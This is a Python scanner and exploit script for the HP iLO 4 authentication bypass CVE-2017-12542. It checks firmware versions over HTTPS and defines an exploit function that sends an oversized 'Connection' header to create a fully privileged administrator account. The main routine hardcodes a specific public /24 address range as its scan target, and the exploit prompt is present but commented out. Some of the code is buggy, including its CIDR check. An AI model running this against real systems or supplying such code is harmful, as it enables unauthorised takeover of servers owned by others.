# !/usr/bin/env python
# HP ILO Scanning and Exploit Tool CVE-2017-12542 #

import urllib3
import re

urllib3.disable_warnings()

searchminorversion = []
searchmajorversion = []


def majorversion(searchmajorversion):
    if not searchmajorversion:
        return False
    elif "(iLO 4)" in searchmajorversion[0]:
        return True
    else:
        return False


def minorversion(searchminorversion):
    if not searchminorversion:
        return False
    elif searchminorversion[0] <= '2.52':
        return True
    else:
        return False


def testxml(ip, port):
    page = 'https://%s/xmldata?item=all'

    if port == "443":
        url = page % ip
    else:
        destination = ip + ':' + port
        url = page % destination

    try:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE', timeout=0.5, retries=0)
        req = http.request('GET', url)
        req.release_conn()
        content = (req.data.decode('utf-8'))
        searchminorversion = re.findall(r'<FWRI>(.*?)</FWRI>', content)
        searchmajorversion = re.findall(r'<PN>(.*?)</PN>', content)
    except Exception as e:
        return

    try:
        if majorversion(searchmajorversion) and minorversion(searchminorversion):
            return True
        else:
            return False
    except IndexError:
        print('No XML Data returned')


def exploit(ip, port, username, password):
    import requests

    accounts_url = 'https://%s/rest/v1/AccountService/Accounts'

    if port == "443":
        url = accounts_url % ip
    else:
        destination = ip + ':' + port
        url = accounts_url % destination

    exploit_trigger = {'Connection': 'A' * 29}

    oem = {
        'Hp': {
            'LoginName': username,
            'Privileges': {
                'LoginPriv': True,
                'RemoteConsolePriv': True,
                'UserConfigPriv': True,
                'VirtualMediaPriv': True,
                'iLOConfigPriv': True,
                'VirtualPowerAndResetPriv': True,
            }
        }
    }
    body = {
        'UserName': username,
        'Password': password,
        'Oem': oem
    }

    try:
        response = requests.post(url, json=body, headers=exploit_trigger, verify=False)
    except Exception as e:
        return False, 'Could not connect to target %s, Reason: %s' % (ip, str(e))

    if response.status_code in [requests.codes.ok, requests.codes.created]:
        return True, response.text
    else:
        return False, 'Server returned status code %d, data: %s' % (response.status_code, response.text)


def hometest(ip, port):
    import requests
    import re

    page = 'https://%s/json/login_session?'

    if port == "443":
        url = page % ip
    else:
        destination = ip + ':' + port
        url = page % destination

    try:
        headers = {'Accept': 'application/json'}
        response = requests.get(url, headers, verify=False, timeout=1.0, retrys=0)
        data = (response.content.decode('utf-8'))
        minorver = re.findall(r'"version":"(.*?)"', data)
    except Exception as e:
        return

    if minorversion(minorver):
        return True
    else:
        return False


if __name__ == '__main__':
    import argparse
    import getpass
    import ipaddress

    port = '9443'

    parser = argparse.ArgumentParser()
    #parser.add_argument('ip', help='target IP')
    parser.add_argument('-p', help='Target Port', required=False)
    parser.add_argument('-t', action='store_true', default=True, help='Test. Trigger the exploit and list all users')
    args = parser.parse_args()

    args.ip = '81.137.196.0/24'

    if '//' in args.ip:
        net4 = ipaddress.ip_network(args.ip)
    else:
        net4 = ipaddress.ip_address(args.ip)

    if args.p:
        port = args.p

    if args.t:
        if net4.hosts:
            for i in net4.hosts():
                print('Attempting %s' % i)
                xmltester = testxml(i.exploded, port)
                hometester = hometest(i.exploded, port)
                if xmltester:
                    print('XML indicates target %s is vulnerable' % i)
                elif hometester:
                    print('HomePage indicates target %s is vulnerable' % i)
                else:
                    print('Target %s may not be vulnerable' % i)
#            print('Would you like to exploit the Target!')
#            exploitilo = input('Type yes to exploit:  ')
#            if exploitilo == 'yes':
#                uname = input('New User:  ')
#                pwd = getpass.getpass(prompt='Password:  ')
#                print('Atempting Exploit')
#                res, ex = exploit(i, port, uname, pwd)
#                if res:
#                    print('Exploit was successful')
#                else:
#                    print('[-] Error! %s' % ex)
#            else:
#                exit()
